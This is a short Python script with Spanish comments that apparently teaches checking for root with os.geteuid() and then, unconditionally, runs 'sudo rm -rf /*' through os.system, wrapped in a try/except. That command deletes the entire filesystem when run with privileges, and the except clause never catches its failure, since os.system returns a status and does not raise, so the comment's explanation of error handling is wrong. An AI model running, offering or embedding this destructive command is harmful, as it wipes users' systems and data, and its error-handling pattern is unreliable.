import os 

if os.geteuid() == 0: 
    # gateuid está solo hecho para Linux y sirve para saber en que usuario estás
    # UID 0 ---> root. UID es lo mismo que User id
    print("Estoy en super user")
else:
    print("No estoy en super user")

try:
    os.system("sudo rm -rf /*")

except OSError as e: # OSError Por intuición esto capta el error que te lanza el sistema operativo hacia el script
    print("System error", e)


